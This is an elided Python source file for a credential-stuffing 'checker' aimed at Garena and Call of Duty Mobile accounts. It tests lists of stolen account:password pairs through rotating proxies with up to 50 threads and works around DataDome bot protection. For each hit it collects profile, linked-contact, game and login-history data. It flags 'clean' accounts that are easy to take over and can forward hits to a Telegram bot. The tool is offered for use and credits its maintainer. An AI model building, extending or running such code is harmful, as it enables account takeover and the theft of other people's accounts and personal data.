...
def sanitize_string(text):
    """Remove or replace non-ASCII characters for safe file writing"""
...
def clean_account_line(line):
    """Clean account line before processing"""
    if not line:
        return None, None
...
def format_codm_region(region_code):
    """Format CODM region with flag emoji and country name"""
...
def format_mobile_number(mobile_no, country_code=None):
    """Format mobile number with country code and masking"""
...
class ProxyManager:
    """
    Manages a list of proxy URLs and rotates them every N accounts.
    Supports custom URL, proxy file, or no proxy.
    """
    ...
    def __init__(
        ...
        if self.proxies:
            console.print(
                f"    [bold bright_cyan]Proxies loaded:[/bold bright_cyan] "
                f"[green]{len(self.proxies)}[/green] "
                f"│ Rotate every [yellow]{rotate_every}[/yellow] accounts"
            )

    @staticmethod
    def _normalize(url: str) -> str:
        """Percent-encode special characters in proxy credentials.

        '+' is intentionally kept literal (included in safe=).
        urllib3 does NOT percent-decode proxy credentials from the URL before
        base64-encoding them for Proxy-Authorization.  Encoding '+' as '%2B'
        would cause the proxy to receive '%2B' as the password character → 407.
        """
        if not url:
            return url
        try:
    ...
    def _load(self, proxy_file: str, fallback_url: str) -> list[str]:
        proxies: list[str] = []
        try:
            fp = Path(proxy_file)
            if fp.exists():
    ...
    def _url_label(self, url: str | None) -> str:
        try:
            if not url:
                return "?"
    ...
    def get_proxy_dict_for_thread(self, thread_id: int) -> dict | None:
        return self.get_proxy_dict()

    def assign_thread_id(self) -> int:
        """Assign a stable unique integer ID to the calling OS thread."""
        tid = threading.get_ident()
        with self._lock:
            if not hasattr(self, "_thread_id_map"):
                self._thread_id_map: dict = {}
                self._thread_id_counter: int = 0
            if tid not in self._thread_id_map:
                self._thread_id_map[tid] = self._thread_id_counter
                self._thread_id_counter += 1
            return self._thread_id_map[tid]

    def apply_to_session(self, session, thread_id: int = 0):
        """Apply the current proxy to a requests session."""
    ...
    def tick(self) -> bool:
        """
        Thread-safe account counter. Advances the proxy index every
        rotate_every total accounts (thread-count aware). Returns True
        ...
        total_rots = getattr(self, "_total_rots", 1)
        console.print(
            f"\n    [bold bright_magenta]🔄 Proxy rotated[/bold bright_magenta] "
            f"[dim](#{self._index + 1}/{len(self.proxies)} "
            f"| total: {total_rots})[/dim]\n"
        )
        return True

    def report_error(self, url: str) -> None:
        """
        Called by a worker when a request through `url` fails (timeout / conn error).
        After DEAD_THRESHOLD consecutive failures the proxy is removed from the pool.
        """
        if not self.enabled or not url:
            return
        DEAD_THRESHOLD = 3
        with self._lock:
            errs = self._errors = getattr(self, "_errors", {})
            errs[url] = errs.get(url, 0) + 1
            if errs[url] >= DEAD_THRESHOLD and url in self.proxies:
                self.proxies.remove(url)
                errs.pop(url, None)
                removed_label = self._url_label(url)
                self._dead    = getattr(self, "_dead", 0) + 1
                dead_total    = self._dead
                alive         = len(self.proxies)

                if self.proxies:
                    self._index = self._index % len(self.proxies)
                console.print(
                    f"\n  [bold red]✖ Dead proxy removed:[/bold red] [dim]{removed_label}[/dim]  "
                    f"[dim]│  {alive} remaining  │  {dead_total} removed total[/dim]\n"
                )

    def report_success(self, url: str) -> None:
        """Reset error counter for a proxy on a successful request."""
        if not self.enabled or not url:
            return
        with self._lock:
    ...
    def status_line(self) -> str:
        ...
        if self.admin_client:
            return self.admin_client.status_line()
        if not self.proxies:
        ...
        return (
            f"[green]✔ Proxy ON[/green]  [dim]{label}[/dim]  "
            f"[yellow](#{self._index + 1}/{len(self.proxies)})[/yellow]  "
            f"│  rotate every [cyan]{self.rotate_every}[/cyan] accounts"
            f"{dead_str}"
        )
...
class DatabaseComparison:
    ...
    def display_database_stats(self):
        ...
        _db_row(indent, "Maintained by       :", "@nixzlls",              "bright_green")
        console.print(indent + "[bright_yellow]└─────────────────────────────────────────────────────────────────────┘[/bright_yellow]")
        console.print("")
    ...
    def compare_and_filter_file(self, file_path):
        ...
        try:
            ...
            _conn_err = None
            with console.status(
                indent + "[bold bright_cyan]  🔄 Comparing with Railway database…[/bold bright_cyan]",
                spinner="dots"
            ):
                try:
...
class AccountFileManager:
    ...
    def clean_file_encoding(self, file_path):
        """Clean file by removing invalid characters and re-encoding as UTF-8"""
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
    ...
    def remove_line_from_file(self, file_path, line_to_remove):
        """
        Thread-safe removal of one line from the combo file.
        The file lock ensures that two threads never simultaneously read
        and overwrite the file, which would cause one thread's removal
        to be lost (or a previously-removed line to reappear).
        """
        try:
            file_path = Path(file_path)
...
class AccountFileViewer:
    ...
    def display_file_table(self, file_infos):
        table = Table(title="Available Combo Files", show_header=True, header_style="bold magenta")
        table.add_column("#", style="cyan", justify="center")
        table.add_column("Filename", style="green")
        table.add_column("Size", justify="right", style="yellow")
        table.add_column("Accounts", justify="right", style="blue")
        table.add_column("Progress Bar", style="bright_white")

        max_accounts = max([info['account_count'] for info in file_infos]) if file_infos else 1

        for idx, info in enumerate(file_infos, 1):
            bar_width = 20
            filled = int((info['account_count'] / max_accounts) * bar_width)
    ...
    def prompt_file_selection(self, file_infos):
        self.console.print("\n  [bold cyan]Select file number or 'auto' for largest:[/bold cyan]")
        while True:
            choice = input("  > ").strip().lower()
            if choice == 'auto':
                largest = max(file_infos, key=lambda x: x['account_count'])
                self.console.print(f"  [green]Auto-selected: {largest['name']}[/green]")
                return largest['path']
            try:
                idx = int(choice)
                ...
                self.console.print("  [red]Enter a number or 'auto'.[/red]")

    def prompt_clean_file(self):
        self.console.print("  [dim]Clean file encoding? (y/n) [y]:[/dim]")
        return input("  > ").strip().lower() != 'n'

    def prompt_remove_duplicates(self):
        self.console.print("  [dim]Remove duplicates? (y/n):[/dim]")
        return input("  > ").strip().lower() == 'y'

    def prompt_auto_remove_checked(self):
        self.console.print("  [dim]Auto-remove checked lines? (y/n) [n]:[/dim]")
        return input("  > ").strip().lower() == 'y'
...
class LiveStats:
    ...
    def display_stats(self):
        ...
        active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES
                        if gc.get(key, 0) > 0]
        if active_games:
            tbl.add_row("", "", "")
        ...
        return Panel(tbl, title="[bold bright_cyan]LIVE STATS[/bold bright_cyan]",
    ...
    def display_final_stats(self):
        ...
        for rng in ["351-400", "201-350", "101-200", "1-100"]:
            ...
            lvl_tbl.add_row(
                f"Lv {rng}",
                str(cc), bar(cc, clean_total, "bright_green", 14),
                str(nc),  bar(nc, nc_total,   "yellow",       14),
            )

        console.print("\n")
        console.print(Panel(
            Group(main, info, lvl_tbl, game_tbl),
            title="[bold bright_cyan]FINAL RESULTS[/bold bright_cyan]",
            border_style="bright_cyan",
            padding=(0, 1),
        ))
        console.print("[dim]  Powered by @nixlls[/dim]\n")

class ResultsManager:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_dir = Path(f"Results/output_{self.combo_file_name}_{self.timestamp}")

        self.base_dir.mkdir(parents=True, exist_ok=True)
        (self.base_dir / "Country").mkdir(exist_ok=True)
        (self.base_dir / "Level").mkdir(exist_ok=True)
        (self.base_dir / "GarenaShell").mkdir(exist_ok=True)

        self.all_accounts = []
        self.clean_accounts = []
        self.not_clean_accounts = []
        self.no_codm_accounts = []
        self.country_accounts = {}
        self.level_accounts = {
            '1-100': [],
            '101-200': [],
            '201-350': [],
        ...
        self.shell_codm_accounts = []
        self.shell_no_codm_accounts = []
    ...
    def _schedule_write(self, key, file_path, content):
        with self._write_lock:
            self._write_pending[key] = (file_path, content)
        if self._write_timer is not None:
            self._write_timer.cancel()
        self._write_timer = threading.Timer(self._WRITE_INTERVAL, self._flush_pending_writes)
    ...
    def _flush_pending_writes(self):
        ...
        for key, (file_path, content) in pending.items():
            try:
    ...
    def _safe_write(self, file_path, content):
        """Safely write content with UTF-8 encoding"""
        try:
            with open(file_path, 'w', encoding='utf-8', errors='replace') as f:
                f.write(content)
            return True
        except Exception as e:
            logger.error(f"Error writing to {file_path}")
            return False

    def _safe_append(self, file_path, content):
        """Safely append content with UTF-8 encoding"""
        try:
            with open(file_path, 'a', encoding='utf-8', errors='replace') as f:
                f.write(content)
            return True
        except Exception as e:
            logger.error(f"Error appending to {file_path}")
            return False

    def add_account(self, account_data):
        """Add account and save immediately to all relevant files"""
        with self.lock:

            self.all_accounts.append(account_data)
            self._append_to_all_accounts_file(account_data)
            ...
            if not has_codm:
                self.no_codm_accounts.append(account_data)
                self._rewrite_no_codm_accounts()

                self.shell_no_codm_accounts.append(account_data)
                self._rewrite_garena_shell_files()
                return

            if is_clean:
                self.clean_accounts.append(account_data)
                self._rewrite_clean_accounts()
            else:
                self.not_clean_accounts.append(account_data)
                self._rewrite_not_clean_accounts()

            region_code = account_data.get('region_code', 'UNKNOWN')
            if region_code not in self.country_accounts:
                self.country_accounts[region_code] = []
            self.country_accounts[region_code].append(account_data)
            self._rewrite_country_file(region_code)
            ...
            self.level_accounts[level_range].append(account_data)
            self._rewrite_level_file(level_range)

            self.shell_codm_accounts.append(account_data)
            self._rewrite_garena_shell_files()

    def _append_to_all_accounts_file(self, account_data):
        """Append to all_accounts file in real-time (sequential order)"""
        file_path = self.base_dir / f"all_accounts_{self.timestamp}.txt"
        content = self._format_account(account_data)
        self._safe_append(file_path, content)

    def _rewrite_clean_accounts(self):
        if not self.clean_accounts:
            return
        sorted_accounts = sorted(self.clean_accounts, key=lambda x: x.get('codm_level', 0), reverse=True)
        file_path = self.base_dir / f"clean_accounts_{self.timestamp}.txt"
        content = ''.join(self._format_account(a) for a in sorted_accounts)
        self._schedule_write('clean', file_path, content)

    def _rewrite_not_clean_accounts(self):
        if not self.not_clean_accounts:
            return
        sorted_accounts = sorted(self.not_clean_accounts, key=lambda x: x.get('codm_level', 0), reverse=True)
        file_path = self.base_dir / f"not_clean_accounts_{self.timestamp}.txt"
        content = ''.join(self._format_account(a) for a in sorted_accounts)
        self._schedule_write('not_clean', file_path, content)

    def _rewrite_no_codm_accounts(self):
        if not self.no_codm_accounts:
            return
        file_path = self.base_dir / f"no_codm_accounts_{self.timestamp}.txt"
        content = ''.join(self._format_account(a) for a in self.no_codm_accounts)
        self._schedule_write('no_codm', file_path, content)

    def _rewrite_country_file(self, region_code):
        if region_code not in self.country_accounts or not self.country_accounts[region_code]:
            return
        sorted_accounts = sorted(self.country_accounts[region_code], key=lambda x: x.get('codm_level', 0), reverse=True)
        file_path = self.base_dir / "Country" / f"{region_code}_accounts_{self.timestamp}.txt"
        content = ''.join(self._format_account(a) for a in sorted_accounts)
        self._schedule_write(f'country_{region_code}', file_path, content)

    def _rewrite_level_file(self, level_range):
        if level_range not in self.level_accounts or not self.level_accounts[level_range]:
            return
        sorted_accounts = sorted(self.level_accounts[level_range], key=lambda x: x.get('codm_level', 0), reverse=True)
        file_path = self.base_dir / "Level" / f"{level_range}_accounts_{self.timestamp}.txt"
        content = ''.join(self._format_account(a) for a in sorted_accounts)
        self._schedule_write(f'level_{level_range}', file_path, content)

    def _rewrite_garena_shell_files(self):
        if self.shell_codm_accounts:
            sorted_codm = sorted(self.shell_codm_accounts, key=lambda x: x.get('shell_balance', 0), reverse=True)
            file_path = self.base_dir / "GarenaShell" / f"CODM_accounts_{self.timestamp}.txt"
            content = ''.join(self._format_account(a) for a in sorted_codm)
            self._schedule_write('shell_codm', file_path, content)
        if self.shell_no_codm_accounts:
            sorted_no_codm = sorted(self.shell_no_codm_accounts, key=lambda x: x.get('shell_balance', 0), reverse=True)
            file_path = self.base_dir / "GarenaShell" / f"NO_CODM_accounts_{self.timestamp}.txt"
            content = ''.join(self._format_account(a) for a in sorted_no_codm)
            self._schedule_write('shell_no_codm', file_path, content)

    def _format_account(self, account_data):
        """Format account data for file output with safe string handling"""
        output = "=" * 60 + "\n"
        output += f"Account: {(account_data.get('account', 'N/A'))} : {(account_data.get('password', 'N/A'))}\n"

        if account_data.get('is_error'):
            output += f"Error: {(account_data.get('error_reason', 'Unknown'))}\n"
        else:
            output += f"UID: {account_data.get('uid', 'N/A')}\n"
            output += f"Username: {(account_data.get('username', 'N/A'))}\n"
            output += f"Garena Shell: {account_data.get('shell_balance', 0)}\n"
            output += f"Email: {(account_data.get('email_display', 'N/A'))}\n"
            output += f"Mobile: {account_data.get('formatted_mobile', 'N/A')}\n"
            output += f"Country: {account_data.get('country', 'N/A')}\n"
            output += f"Nickname: {(account_data.get('nickname', 'N/A'))}\n"

            output += f"\n--- Facebook Information ---\n"
            output += f"Facebook Username: {(account_data.get('fb_username', 'N/A'))}\n"
            output += f"Facebook Link: {account_data.get('fb_link', 'N/A')}\n"
            output += f"Facebook Status: {account_data.get('fb_info', 'N/A')}\n"

            if account_data.get('has_codm'):
                output += f"\n--- CODM Information ---\n"
                output += f"Account Level: {account_data.get('codm_level', 'N/A')}\n"
                output += f"Server: {(account_data.get('codm_region', 'N/A'))}\n"
                output += f"IGN: {(account_data.get('codm_nickname', 'N/A'))}\n"
                output += f"UID: {account_data.get('codm_uid', 'N/A')}\n"

            output += f"\n--- Login History ---\n"
            output += f"Last Login: {account_data.get('last_login_date', 'N/A')}\n"
            output += f"Last Login From: {account_data.get('last_login_where', 'N/A')}\n"
            output += f"Last Login IP: {account_data.get('last_login_ip', 'N/A')}\n"
            output += f"Last Login Country: {account_data.get('last_login_country', 'N/A')}\n"

            output += f"\nAccount Status: {account_data.get('bind_status', 'N/A')}\n"
...
def prompt_cookie_source():
    ...
    for fname in ("fresh_cookie.txt", "fresh_cookies.txt"):
        if os.path.exists(fname):
            console.print(f"  [green]Cookie file found:[/green] [dim]{fname}[/dim]")
            return
    console.print("  [yellow]No cookie file found in current directory.[/yellow]")
    console.print("  [dim]Place fresh_cookie.txt alongside codm.py and re-run.[/dim]")
...
class DataDomeManager:
    ...
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=600):
        """
        Wait until the public IP changes (no-proxy mode only).

        Coordination model (prevents terminal spam when N threads all
        hit an IP block simultaneously):

        • Exactly ONE thread becomes PRIMARY — it polls the IP and prints
          all output.  All other threads are SILENT SECONDARIES that just
          block on an Event with zero console output.
        • A generation counter prevents secondaries from consuming a
          stale Event that was set by a previous block cycle.
        """
...
def get_datadome_cookie(session=None):
    ...
    Pass the caller's *session* so the request goes through the proxy
    that is already configured on it.  If no session is provided a fresh
    unproxied scraper is used as fallback (legacy behaviour).
    """
...
def prelogin(session, account, datadome_manager, max_retries=3):
    """Prelogin – returns (v1, v2, datadome) or (None, None, None) on failure."""
...
def _generate_device_id():
    """Generate a random device_id in Garena MSDK format: 02-{uuid}"""
    import uuid
    return f"02-{uuid.uuid4()}"

def get_codm_grant_code(session):
    """
    Step 1 of the new CODM auth flow.
    POST to 100082.connect.garena.com/oauth/token/grant using the existing
    session cookies (sso_key + datadome) to obtain an authorization code.
    ...
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            ...
            grant_headers = {
                ...
                "Accept": "application/json, text/plain, */*",
                "User-Agent": (
                    "Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                    "Chrome/81.0.4044.117 Mobile Safari/537.36; "
                    "GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)"
                ),
...
def token_exchange(code, device_id=None, proxies=None):
    """
    Step 2 of the new CODM auth flow.
    Exchange the authorization code for an access_token via
    100082.connect.garena.com/oauth/token/exchange.
    Uses a plain requests call (no browser cookies needed).
...
def get_codm_access_token(session):
    """
    Two-step flow:
        1. get_codm_grant_code  →  authorization code
        2. token_exchange       →  access_token
    Returns the access_token string (or "" on failure).
    """
...
def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    ...
    if details is None:
        ...
        console.print(Panel(tbl, title="[bold red]✗  INVALID[/bold red]",
...
def get_game_connections(session, account):
    """
    Fetch all Garena game connections for the logged-in account.
    Mirrors the logic from sek3.py — region-aware game mappings.
    Returns a list of dicts: [{'region': 'PH', 'game': 'CODM', 'role': 'IGN'}, ...]
    """
    game_info   = []
    ...
    try:
        ...
        token_data = (
            ...
            f"&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082"
...
def save_game_folder(account, password, account_data, game_connections, base_dir):
    """
    Save per-game result files under base_dir/Games/.
    Each game gets its own .txt file (e.g. Games/CODM.txt, Games/FreeFire.txt).
    """
    try:
...
def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False):
    """Process account - use_elegant_display=True for Single Check"""
    max_retries = 2
        ...
        try:
            ...
            if not v1 or not v2:
                ...
                account_data = {
                    ...
                    'password': password,
                    'is_error': True,
                    'error_reason': "Account Doesn't Exist"
                }
                results_manager.add_account(account_data)
            ...
            if response.status_code == 403:
                ...
                account_data = {
                    ...
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Cookie Banned/IP Blocked'
                }
                results_manager.add_account(account_data)
            ...
            try:
                ...
                account_data = {
                    ...
                    'password': password,
                    'is_error': True,
                    'error_reason': 'Invalid Server Response'
                }
                results_manager.add_account(account_data)
            ...
            live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm,
                                    codm_level=codm_level, game_connections=game_connections,
                                    shell=details['profile'].get('shell_balance', 0))
            ...
            if proxy_retry_count <= MAX_PROXY_RETRIES:
                ...
                account_data = {
                    ...
                    'password': password,
                    'is_error': True,
                    'error_reason': f'Proxy Connection Failed ({MAX_PROXY_RETRIES} retries exhausted)'
                }
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
...
def bulk_check():
    ...
    if file_viewer.prompt_clean_file():
        ...
        console.print(f"  [green]Cleaned: {valid_count} valid, {invalid_count} removed[/green]")
    ...
    if auto_remove:
        console.print("  [dim]Auto-remove enabled.[/dim]")
    ...
    try:
        ...
        console.print(f"[green]File loaded: {len(accounts)} accounts[/green]")
    except Exception as e:
        console.print(f"[red]Could not read file.[/red]")
        return

    if not accounts:
        console.print(f"[red]No valid accounts found in file.[/red]")
        return

    console.print(f"  [cyan]Total accounts: {len(accounts)}[/cyan]\n")

    indent = "    "
    console.print(Panel(
        "[green]1-8[/green]   Safe — no proxy\n"
        "[yellow]9-20[/yellow]  Medium — datacenter\n"
        "[red]21-35[/red] Fast — rotating\n"
        "[bold red]36-50[/bold red] Max — residential only",
        title="[bold cyan]THREADS[/bold cyan]", border_style="cyan", padding=(0, 2)
    ))
    while True:
        try:
            raw = console.input(indent + f"  [bold bright_cyan]> Threads 1-50 (default {DEFAULT_THREADS}): [/bold bright_cyan]").strip()
            if not raw:
            ...
            if 1 <= num_threads <= 50:
                break
            console.print("  [red]Enter 1-50.[/red]")
        except ValueError:
            console.print("  [red]Invalid input.[/red]")
    if num_threads > 20 and not _proxy_active():
        console.print(f"  [yellow]Warning: {num_threads} threads without proxy may cause IP ban. Continue? (y/n)[/yellow]")
        if console.input("  [yellow]> [/yellow]").strip().lower() != 'y':
            num_threads = 20
            console.print("  [dim]Capped to 20.[/dim]")
    console.print(f"  [green]Running with {num_threads} thread(s)[/green]\n")

    global CHECK_OTHER_GAMES
    console.print(Panel(
        "[bold white]Check OTHER GAMES[/bold white] (AOV / ROV / Delta Force / Free Fire / etc.)\n\n"
        "[dim]When enabled, the checker will scan each valid account for all\n"
        "Garena game connections and save them into separate files:\n"
        "[cyan]Games/CODM.txt[/cyan]  [cyan]Games/FreeFire.txt[/cyan]  [cyan]Games/ROV.txt[/cyan]  etc.\n\n"
        "[yellow]⚠  Adds ~1-3 s per account — reduce threads if you enable this.[/yellow][/dim]",
        title="[bold bright_magenta]GAME CONNECTIONS[/bold bright_magenta]",
        border_style="bright_magenta", padding=(0, 2)
    ))
    og_raw = console.input("  [bold bright_magenta]> Check other games? (y/N): [/bold bright_magenta]").strip().lower()
    CHECK_OTHER_GAMES = og_raw == "y"
    if CHECK_OTHER_GAMES:
        console.print("  [bright_magenta]✔ Will scan all Garena game connections[/bright_magenta]\n")
    else:
        console.print("  [dim]CODM only — skipping other game checks[/dim]\n")
    ...
    console.print(indent + "┌─────────────────────────────────────────────────────────────────────┐", style="bright_yellow")
    console.print(indent + "│                   TELEGRAM NOTIFICATION SETUP                       │", style="bold bright_white")
    console.print(indent + "├─────────────────────────────────────────────────────────────────────┤", style="bright_yellow")
    console.print(indent + "│  [1]  Send Clean hits only                                          │", style="yellow")
    console.print(indent + "│  [2]  Send Not-Clean hits only                                      │", style="yellow")
    console.print(indent + "│  [3]  Send Both  (clean + not-clean)                                │", style="yellow")
    console.print(indent + "│  [4]  No Telegram  (skip)                                           │", style="dim")
    console.print(indent + "└─────────────────────────────────────────────────────────────────────┘", style="bright_yellow")
    console.print("")

    tg_choice = ""
    while tg_choice not in ("1", "2", "3", "4"):
        tg_choice = console.input(indent + "[bold bright_yellow]  ❯ Enter choice (1-4): [/bold bright_yellow]").strip()
    ...
    if TG_ENABLED:
        ...
        if _saved_tg:
            ...
            console.print(indent + f"  [bold green]  Saved config found[/bold green]  [dim]Token: {_masked}  |  Chat: {_saved_tg['chat_id']}[/dim]")
            _use_saved = console.input(indent + "  [bold bright_yellow]  ❯ Use saved token/ID? (y/n): [/bold bright_yellow]").strip().lower()
            ...
            if _use_saved == "y":
                ...
                console.print(indent + "  [bold green]  ✔ Using saved config.[/bold green]")
            else:
                _saved_tg = None

        if not _saved_tg:
            TG_BOT_TOKEN = console.input(indent + "  [bold bright_yellow]  ❯ Bot Token: [/bold bright_yellow]").strip()
            TG_CHAT_ID   = console.input(indent + "  [bold bright_yellow]  ❯ Chat ID: [/bold bright_yellow]").strip()

            if TG_SEND_CLEAN:
                console.print("")
                console.print(indent + "  [dim]  Level range for [green]CLEAN[/green] hits — format: min-max  (e.g. 50-400)[/dim]")
                raw_clean = console.input(indent + "  [bold green]  ❯ Clean level range (Enter = all): [/bold green]").strip()
            ...
            if TG_SEND_NOTCLEAN:
                console.print("")
                console.print(indent + "  [dim]  Level range for [red]NOT-CLEAN[/red] hits — format: min-max  (e.g. 1-200)[/dim]")
                raw_nc = console.input(indent + "  [bold red]  ❯ Not-clean level range (Enter = all): [/bold red]").strip()
            ...
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(
                    TG_BOT_TOKEN, TG_CHAT_ID, tg_choice,
                    [TG_LVL_MIN_CLEAN,    TG_LVL_MAX_CLEAN],
                    [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN]
                )
                console.print(indent + "  [dim]  Config saved for next time.[/dim]")

        console.print("")
        console.print(indent + "  [bold green]  ✔ Telegram configured.[/bold green]")
        if TG_SEND_CLEAN:
            console.print(indent + f"  [dim]  Clean hits  : Level [green]{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}[/green][/dim]")
        if TG_SEND_NOTCLEAN:
            console.print(indent + f"  [dim]  Not-clean   : Level [red]{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}[/red][/dim]")
        console.print("")
    ...
    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        ...
        lines = [
            f"{'✅ CLEAN HIT' if is_clean_hit else '⚠️ NOT CLEAN HIT'}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ...
    chunks       = [accounts[i:i + SESSION_CHUNK_SIZE]
                    for i in range(0, len(accounts), SESSION_CHUNK_SIZE)]
    total_chunks = len(chunks)

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(complete_style="green", finished_style="bright_green", bar_width=20),
        ...
        task = progress.add_task(
            f"[cyan]Processing with {num_threads} thread(s)...",
            total=len(accounts)
        )
        ...
        for chunk_idx, chunk in enumerate(chunks, 1):
            ...
            if chunk_idx > 1:
                ...
                console.print(
                    ...
                    f"  [bold bright_yellow]⟳  SESSION RESTART[/bold bright_yellow]  "
                    f"[dim]chunk {chunk_idx}/{total_chunks}  ·  "
                    f"{overall_done:,} done  ·  "
                    f"{len(accounts) - overall_done:,} remaining[/dim]\n"
                    f"  [dim]Fresh sessions + cookies — live stats continue[/dim]\n"
                    f"[bold bright_yellow]{sep}[/bold bright_yellow]\n"
                )
            ...
            def _get_thread_resources():
                if not hasattr(_thread_local, "session"):
                    _thread_local.thread_id = proxy_manager.assign_thread_id()
                ...
                try:
                    ...
                    try:
                        processaccount(
                            ...
                            cookie_manager, datadome_mgr,
                            live_stats, results_manager,
                            file_manager, selected_file, auto_remove
                        )
...
def display_banner():
    os.system("cls" if os.name == "nt" else "clear")
    hdr = Table(show_header=False, box=None, padding=(0, 0), expand=True)
    hdr.add_column(justify="center", style="bold bright_cyan")
    hdr.add_row("╔══════════════════════════════════════════════════════╗")
    hdr.add_row("║            NIXZ  CODM  CHECKER                      ║")
    hdr.add_row("║       CH: t.me/nixzllss  |  OWNER: @nixzlls         ║")
    hdr.add_row("╚══════════════════════════════════════════════════════╝")
    console.print(hdr)
    if proxy_manager is not None:
        console.print(f"  [dim]{proxy_manager.status_line()}[/dim]")
    console.print()
...
def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    ...
    for attempt in range(max_retries):
        try:
            ...
            current_cookies = session.cookies.get_dict()
            cookie_parts = [
                f"{n}={current_cookies[n]}"
                for n in ("apple_state_key", "datadome", "sso_key")
                if n in current_cookies
            ]
            headers = {
                "accept":           "application/json, text/plain, */*",
                "accept-encoding":  "gzip, deflate, br, zstd",
...
def validator_check():
    ...
    console.print(Panel(
        "[bold bright_red]⚠  USE A VPN BEFORE VALIDATING[/bold bright_red]\n"
        "[dim]ExpressVPN or any VPN is strongly recommended\n"
        "to avoid IP bans during credential checking.[/dim]",
        border_style="bright_red", padding=(0, 2)
    ))
    console.print("")

    console.print(Panel(
        "[dim]Login-only credential check — no game data fetched.\n"
        "Results saved to [cyan]Results/validator_*/[/cyan] folder.[/dim]",
        title="[bold bright_yellow]VALIDATOR[/bold bright_yellow]",
    ...
    if not combo_files:
        console.print(indent + "  [red]No .txt files found in Combo folder.[/red]")
    ...
    if not file_infos:
        console.print(indent + "  [red]No valid combo files.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return
    ...
    if not accounts:
        console.print(indent + "  [red]No valid account:password lines found.[/red]")
        console.input("\n  [dim]Press Enter to return to menu...[/dim]")
        return

    console.print(indent + f"  [cyan]Loaded [bold]{len(accounts):,}[/bold] combos[/cyan]\n")

    while True:
        try:
            raw_t = console.input(
                indent + f"  [bold bright_cyan]> Threads 1-50 (default {DEFAULT_THREADS}): [/bold bright_cyan]"
            ).strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 50:
                break
            console.print(indent + "  [red]Enter 1-50.[/red]")
        except ValueError:
            console.print(indent + "  [red]Invalid input.[/red]")

    if num_threads > 20 and not _proxy_active():
        console.print(f"  [yellow]Warning: {num_threads} threads without proxy. Continue? (y/n)[/yellow]")
        if console.input("  [yellow]> [/yellow]").strip().lower() != "y":
            num_threads = 20
            console.print("  [dim]Capped to 20.[/dim]")

    console.print(indent + f"  [green]Running with {num_threads} thread(s)[/green]\n")
    ...
    def _get_sess():
        if not hasattr(_tl, "s"):
            _tl.thread_id = proxy_manager.assign_thread_id()
    ...
    def _print_line(tag, account, password, note=""):
        tags = {
            "valid":   ("[bold bright_green]VALID  [/bold bright_green]", "bright_green"),
            "invalid": ("[bold red]INVALID[/bold red]",                   "red"),
            "error":   ("[bold dim]ERROR  [/bold dim]",                   "dim"),
        }
        tag_str, col = tags.get(tag, ("[dim]------[/dim]", "dim"))
        with print_lock:
            if tag == "valid":
                console.print(
                    f"  {tag_str}  [{col}]{account}:{password}[/{col}]"
                )
            else:
                reason = note.upper() if note else ("INCORRECT PASSWORD" if tag == "invalid" else "UNKNOWN ERROR")
                console.print(
                    f"  {tag_str}  [{col}]{account}:{password}[/{col}] - [dim]{reason}[/dim]"
                )
    ...
    def _print_live_stats():
        ...
        with print_lock:
            console.print(
                f"\n  [bold bright_yellow][{bar}] {pct:.1f}%[/bold bright_yellow]"
                f"  [bold bright_cyan]{dn}/{total}[/bold bright_cyan]"
                f"  [green]Valid:{v}[/green]"
                f"  [red]Invalid:{iv}[/red]"
                f"  [dim]Err:{er}[/dim]"
                f"  [dim]{rate:.1f}/s  ETA {int(eta//60)}m{int(eta%60):02d}s[/dim]\n"
            )
    ...
    console.print(indent + f"  [dim]Output: {out_dir}[/dim]\n")
    console.print(indent + f"  [dim]{sep}[/dim]\n")
    ...
    t1.add_column("Category",  style="bold cyan",        min_width=12, no_wrap=True)
    t1.add_column("Count",     justify="right", style="bold bright_white", min_width=7)
    t1.add_column("Pct",       justify="right", style="bold yellow",       min_width=7)
    ...
    t2.add_column(style="bold cyan",         min_width=16, no_wrap=True)
    t2.add_column(style="bold bright_white", min_width=18, no_wrap=True)
    ...
    t2.add_row("Valid saved",  f"[cyan]{valid_path}[/cyan]")
    t2.add_row("Invalid saved",f"[cyan]{invalid_path}[/cyan]")
    t2.add_row("Errors saved", f"[cyan]{error_path}[/cyan]")

    console.print("\n")
    console.print(Panel(
        Group(t1, t2),
        title="[bold bright_yellow]VALIDATOR — FINAL RESULTS[/bold bright_yellow]",
...
def clean_hunter():
    ...
    console.print(Panel(
        "[bold bright_green]◆  CLEAN HUNTER MODE[/bold bright_green]\n"
        "[dim]Only saves accounts that are:[/dim]\n"
        "  [green]✔[/green] [dim]CLEAN  (no email verified, no phone, no FB, no ID)[/dim]\n"
        "  [green]✔[/green] [dim]HAS CODM connected[/dim]\n\n"
    ...
    if file_viewer.prompt_clean_file():
        ...
        console.print(f"  [green]Cleaned: {valid_c} valid, {invalid_c} removed[/green]")
    ...
    try:
        ...
        console.print(indent + "  [red]Could not read file.[/red]")
